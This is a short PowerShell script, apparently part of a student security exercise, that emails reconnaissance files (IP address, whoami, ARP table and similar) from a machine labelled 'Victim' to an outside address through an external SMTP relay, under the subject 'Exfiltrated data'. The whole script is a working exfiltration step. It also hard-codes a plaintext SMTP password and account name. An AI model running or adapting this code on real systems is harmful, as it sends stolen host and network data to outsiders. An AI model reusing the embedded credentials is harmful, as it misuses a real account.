$From = "Victim <victim@victim.com>"
$To = "Jonathan Stross <jonathan.stross@stud.h-da.de>"
$Subject = "Exfiltrated data"
$Body = "Please find attached the exfiltrated data."
$SMTPServer = "smtp-relay.sendinblue.com"
$SMTPPort = "587"
$Password = ConvertTo-SecureString "7RQ6jML4zFaEZHxX" -AsPlainText -Force
$Username = "se.patlock@gmail.com"
$Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $Username, $Password
Send-MailMessage -From $From -to $To -Subject $Subject -Body $Body -BodyAsHtml -SmtpServer $SMTPServer -Port $SMTPPort -Credential $Credentials -Attachments "ipaddress.txt", "landscape.txt", "whoami.txt", "arptable.txt"